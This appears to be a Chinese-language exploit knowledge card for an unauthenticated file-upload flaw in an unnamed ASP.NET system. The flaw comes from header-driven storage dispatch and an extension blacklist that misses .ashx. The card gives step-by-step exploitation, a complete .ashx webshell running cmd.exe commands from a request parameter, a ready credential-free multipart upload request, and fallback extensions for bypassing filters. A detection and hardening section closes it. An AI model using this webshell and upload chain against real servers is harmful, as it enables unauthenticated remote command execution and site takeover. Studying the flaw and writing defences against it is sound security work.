---
id: web-generic-file-upload-noauth-storage-factory-header-dispatch-ashx-blacklist
title: 免登录 /File/UploadFile 由 storagetype 头分发到 LocalStorage，路径由 basepath+vguid 拼接、扩展名黑名单漏掉 .ashx
type: scenario
domain: web
path: web/generic/file-upload
technique: noauth-storage-factory-header-dispatch-localstorage-ashx-blacklist-bypass
aliases:
- IsFileStorageBack
- CreateFileStorageServ
- StorageFactory CreateStorage
- CheckInvalidPathChars MergePath
- StorageExtNameFilter_Calling
- CloneRequestToJson
- ashx 免登录上传
tags:
- web
- dotnet
- aspnet
- file-upload
- blacklist-bypass
- webshell
- iis
- unauthenticated
- storage-factory
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:12:33+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文与反编译片段文字；原理/触发条件/storagetype 头分发/LocalStorage 默认分支/basepath+vguid 拼接/StorageExtNameFilter_Calling 漏 ashx 与原文一致，PoC 请求包与原文一致，ashx 载荷为按正文补全的通用实现、未验证执行；原文未写受影响版本
---

## 一句话结论

该系统的 `/File/UploadFile` 被放进鉴权白名单因而免登录可访问；它按请求头 `storagetype` 选择存储实现（不传或传 `0` 即落到 `LocalStorage`），落盘路径由表单的 `basepath` 与 `vguid` 经 `CheckInvalidPathChars` + `MergePath` 拼接，文件名直接取 multipart 的 `filename`；而扩展名过滤 `StorageExtNameFilter_Calling` 的黑名单里没有 `.ashx`，因此上传一个 `.ashx` 处理程序即可在 Web 目录落地并执行，直接 getshell。

## 原理

- 入口层缺陷：`/file/UploadFile` 在鉴权白名单中，`CloneRequestToJson` 又把 `Form`、`QueryString`、`Headers`（含 `storagetype`）以及 base64 编码的 `contentHeaders` 全部合并进一个 JObject 作为方法参数。也就是说“控制器 + 存储实现 + 落盘参数”三层都由客户端控制，攻击者不需要任何凭据或会话。
- 分发层缺陷：配置项 `IsFileStorageBack` 为 0 时跳过旧存储分支，走 `CreateFileStorageServ().UploadFile()`；`StorageFactory.CreateStorage` 在未传 storagetype 时默认 `"0" => new LocalStorage()`。即“存储后端选择”是可被请求头覆盖的开关，而默认实现恰好是本地磁盘。
- 路径层缺陷：`StorageHelper.MergePath` 用 `Path.Combine` 拼接 `basepath` 与 `vguid`，`CheckInvalidPathChars` 只做“非法字符”检查（关心的是 `\0`、`<`、`>` 等字符串合法性），**不做 `..`、绝对路径、盘符规范化**。因此 `basepath`/`vguid` 可用于控制落盘目录（本卡只依赖默认站点目录即可完成 getshell，路径穿越属同一缺陷的延伸）。
- 写入层缺陷：`new FileStream(text, FileMode.OpenOrCreate, FileAccess.Write)` + `inputStream.CopyTo(fileStream)` 直接写原始字节，不重命名、不追加后缀、不校验内容（既无内容类型嗅探，也无图片重编码），文件名与扩展名完全取自 `filename`。
- 过滤层缺陷（关键）：唯一的防线是落盘前的 `StorageExtNameFilter_Calling`，它是**黑名单**，覆盖部分脚本扩展但漏掉 `.ashx`。IIS 默认把 `.ashx` 映射到 ASP.NET 的一般处理程序（`SimpleHandlerFactory`），只要上传目录允许脚本执行，请求该文件就会编译执行其中的 `<%@ WebHandler %>` 代码。
- 三层组合后：免登录 → 默认本地存储 → 原始字节写盘 → 黑名单漏项，四个“看起来都做了点防护”的点相乘等于无防护。

## 触发条件

- `/File/UploadFile`（或同类统一上传接口）位于鉴权白名单，无需会话即可调用。
- 存储实现由请求头/参数（`storagetype`）选择，默认值落到本地磁盘存储。
- 落盘路径由用户可控字段拼接，或至少文件名/扩展名完全由用户提供。
- 扩展名校验为黑名单且未覆盖 `.ashx`/`.asmx`/`.cshtml`/`.config` 等 IIS 可解析扩展。
- 目标目录位于站点根下且允许脚本执行。

## 利用步骤

1. 从 web.config/反编译确认 `IsFileStorageBack=0`、`CreateStorage` 的默认分支为 `LocalStorage`、以及 `StorageExtNameFilter_Calling` 的扩展名清单（重点确认是否含 `.ashx`）。
2. 确认 `/file/UploadFile` 在鉴权白名单（未带 Cookie 直接请求不返回 401/跳登录）。
3. 构造 multipart 请求：`basepath` 留空或指向站点目录、`vguid` 传随机串、`file` 部分 `filename="x.ashx"`，内容为 WebHandler 代码；不需要带 `storagetype`（默认即本地存储），也不需要 `contentHeaders`。
4. 从响应中取落盘路径/URL，直接访问该 `.ashx`，带上命令参数验证执行。
5. 若 `.ashx` 被拦，改 `.asmx`、`.cshtml`、`.config`、`.cer` 或双扩展名（`.ashx.jpg` 配合解析配置）。

## PoC

最小 `.ashx` 载荷（ASP.NET 一般处理程序，`<%@ WebHandler %>` 指令 + `ProcessRequest`）：

```aspx
<%@ WebHandler Language="C#" Class="Cmd" %>
using System; using System.Web; using System.Diagnostics;
public class Cmd : IHttpHandler {
    public void ProcessRequest(HttpContext ctx) {
        ctx.Response.ContentType = "text/plain";
        var p = new ProcessStartInfo("cmd.exe", "/c " + ctx.Request["c"]);
        p.RedirectStandardOutput = true; p.UseShellExecute = false;
        ctx.Response.Write(Process.Start(p).StandardOutput.ReadToEnd());
    }
    public bool IsReusable { get { return false; } }
}
```

上传请求（无需任何 Cookie / Token）：

```http
POST /File/UploadFile?a=1 HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQIimhXw3aj8cZ3xg
Content-Length: 379

------WebKitFormBoundaryQIimhXw3aj8cZ3xg
Content-Disposition: form-data; name="basepath"

------WebKitFormBoundaryQIimhXw3aj8cZ3xg
Content-Disposition: form-data; name="vguid"

xxxxxxxxx
------WebKitFormBoundaryQIimhXw3aj8cZ3xg
Content-Disposition: form-data; name="file"; filename="123.ashx"

<ashx payload>
------WebKitFormBoundaryQIimhXw3aj8cZ3xg--
```

访问 `http://target/<落盘目录>/123.ashx?c=whoami` 验证命令执行。

## 变体与关联

- 变体：`storagetype: 2` 时 `flag=false`，`inputStream` 改为 `baseRequest.InputStream` 且文件内容被放进 `filebuf` 字段；该分支用于对接远端对象存储，行为与本地存储不同，可作为“存储后端可被客户端切换”的旁证。
- 变体：`contentHeaders`（base64 的 JSON）会被 `JObject.MergeInto` 合并进参数对象，因此除了 `storagetype`，其它落盘参数（含 `filename`、`basepath`）也能通过请求头注入，绕过前置表单校验。
- 变体：`basepath`/`vguid` 若含 `..` 且 `MergePath` 未规范化，可把文件写到站点根之外的目录；反之可在站点内选择任意子目录以命中允许执行的路径。
- 关联：[[web-generic-file-upload-dotnet-blacklist-only-asp-aspx]]（同为 .NET 黑名单漏 IIS 扩展，但入口需登录、落盘走 MVC `SaveAs`）、[[web-generic-file-upload-ashx-method-dispatch-frontend-js-unauth-aspx]]（`.ashx` 另一种存在形式）、[[web-generic-file-upload-weak-suffix-bypass]]（后缀校验整体缺失的更弱形态）。
- 边界：`StorageExtNameFilter_Calling` 改为白名单（只允许图片/文档）且覆盖 `.ashx`、上传目录禁止脚本执行、接口移出鉴权白名单时，本链不成立。

## 检测与防御

- 入口层：把统一上传接口移出鉴权白名单，要求登录并对调用方做授权；不要用一个接口同时服务所有业务。
- 分发层：存储后端选择必须由服务端配置决定，禁止由 `storagetype` 等客户端参数切换；`contentHeaders` 之类“整包合并参数”的设计应取消。
- 校验层：扩展名改白名单（按业务只允许必要类型），并对最终落盘名做服务端重命名（UUID + 固定后缀）；同时做内容类型检测（魔数）与图片重编码。
- 写入层：`basepath`/`vguid` 不参与路径拼接，改为服务端按业务生成的目录 ID；对 `Path.GetFullPath` 结果做“必须位于上传根目录之内”的前缀校验。
- 文件系统层：上传目录关闭脚本执行（IIS 中配置 handler 移除/`<location>` 拒绝 `.ashx/.aspx/.config`），并把上传目录与站点代码目录分离。
- 检测：对 `/File/UploadFile` 的未认证调用、`storagetype`/`contentHeaders` 请求头出现、落盘文件名带 `.ashx/.asmx/.cshtml/.config`、以及上传目录内新增文件被 HTTP 访问并返回动态内容的行为告警。
